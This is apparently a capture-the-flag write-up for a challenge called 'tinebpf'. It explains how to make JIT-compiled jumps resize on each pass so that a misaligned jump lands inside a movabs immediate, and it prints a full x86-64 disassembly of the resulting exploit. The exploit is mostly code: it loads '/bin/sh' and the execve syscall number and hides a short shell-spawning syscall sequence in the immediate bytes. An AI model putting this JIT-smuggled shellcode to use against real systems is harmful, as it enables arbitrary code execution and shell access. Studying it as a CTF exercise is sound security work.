# tinebpf

Run `./disas2.sh` to get hex of input. Essentially this tries to make two jumps
(one conditional and one unconditional) that will cause the jump sizes to change
every iteration. We have two of these so that the size of the code remains the
same:

```
-\  />
 |  |
 |  |
 |  |
 |  |
 |  |
 |  |
 |  |
 | -/
 \>
```

This will allow the first jump to be misaligned and into the next instruction (a
inside a movabs), allowing us to have a few bytes of code

disassembly:
```x86asm
00000000  4831C0            xor rax,rax
00000003  4831DB            xor rbx,rbx
00000006  4831C9            xor rcx,rcx
00000009  4831D2            xor rdx,rdx
0000000C  4831ED            xor rbp,rbp
0000000F  4831F6            xor rsi,rsi
00000012  4831FF            xor rdi,rdi
00000015  4D31C0            xor r8,r8
00000018  4D31C9            xor r9,r9
0000001B  4D31D2            xor r10,r10
0000001E  4D31DB            xor r11,r11
00000021  4D31E4            xor r12,r12
00000024  4D31ED            xor r13,r13
00000027  4D31F6            xor r14,r14
0000002A  4D31FF            xor r15,r15
0000002D  48B92F62696E2F73  mov rcx,0x68732f6e69622f
         -6800
00000037  B83B000000        mov eax,0x3b
0000003C  4885C0            test rax,rax
0000003F  0F8580000000      jnz near 0xc5
00000045  50                push rax
00000046  52                push rdx
00000047  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
0000004E  4889F0            mov rax,rsi
00000051  31D2              xor edx,edx
00000053  41F7F3            div r11d
00000056  4989C3            mov r11,rax
00000059  5A                pop rdx
0000005A  58                pop rax
0000005B  4C89DE            mov rsi,r11
0000005E  50                push rax
0000005F  52                push rdx
00000060  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
00000067  4889F0            mov rax,rsi
0000006A  31D2              xor edx,edx
0000006C  41F7F3            div r11d
0000006F  4989C3            mov r11,rax
00000072  5A                pop rdx
00000073  58                pop rax
00000074  4C89DE            mov rsi,r11
00000077  50                push rax
00000078  52                push rdx
00000079  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
00000080  4889F0            mov rax,rsi
00000083  31D2              xor edx,edx
00000085  41F7F3            div r11d
00000088  4989C3            mov r11,rax
0000008B  5A                pop rdx
0000008C  58                pop rax
0000008D  4C89DE            mov rsi,r11
00000090  50                push rax
00000091  52                push rdx
00000092  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
00000099  4889F0            mov rax,rsi
0000009C  31D2              xor edx,edx
0000009E  41F7F3            div r11d
000000A1  4989C3            mov r11,rax
000000A4  5A                pop rdx
000000A5  58                pop rax
000000A6  4C89DE            mov rsi,r11
000000A9  50                push rax
000000AA  52                push rdx
000000AB  4D89FB            mov r11,r15
000000AE  31D2              xor edx,edx
000000B0  41F7F3            div r11d
000000B3  4989C3            mov r11,rax
000000B6  5A                pop rdx
000000B7  58                pop rax
000000B8  4C89D8            mov rax,r11
000000BB  05EFBEA1C0        add eax,0xc0a1beef
000000C0  EB84              jmp short 0x46
000000C2  48B8009051545F0F  mov rax,0xff050f5f54519000
         -05FF
000000CC  E981000000        jmp 0x152
000000D1  50                push rax
000000D2  52                push rdx
000000D3  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
000000DA  31D2              xor edx,edx
000000DC  41F7F3            div r11d
000000DF  4989C3            mov r11,rax
000000E2  5A                pop rdx
000000E3  58                pop rax
000000E4  4C89D8            mov rax,r11
000000E7  50                push rax
000000E8  52                push rdx
000000E9  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
000000F0  31D2              xor edx,edx
000000F2  41F7F3            div r11d
000000F5  4989C3            mov r11,rax
000000F8  5A                pop rdx
000000F9  58                pop rax
000000FA  4C89D8            mov rax,r11
000000FD  50                push rax
000000FE  52                push rdx
000000FF  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
00000106  31D2              xor edx,edx
00000108  41F7F3            div r11d
0000010B  4989C3            mov r11,rax
0000010E  5A                pop rdx
0000010F  58                pop rax
00000110  4C89D8            mov rax,r11
00000113  50                push rax
00000114  52                push rdx
00000115  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
0000011C  31D2              xor edx,edx
0000011E  41F7F3            div r11d
00000121  4989C3            mov r11,rax
00000124  5A                pop rdx
00000125  58                pop rax
00000126  4C89D8            mov rax,r11
00000129  50                push rax
0000012A  52                push rdx
0000012B  49C7C3EFBEA1C0    mov r11,0xffffffffc0a1beef
00000132  31D2              xor edx,edx
00000134  41F7F3            div r11d
00000137  4989C3            mov r11,rax
0000013A  5A                pop rdx
0000013B  58                pop rax
0000013C  4C89D8            mov rax,r11
0000013F  05EFBEA1C0        add eax,0xc0a1beef
00000144  05EFBEA1C0        add eax,0xc0a1beef
00000149  4839C0            cmp rax,rax
0000014C  7483              jz 0xd1
0000014E  05EFBEA1C0        add eax,0xc0a1beef
00000153  B83C000000        mov eax,0x3c
00000158  0F05              syscall
```

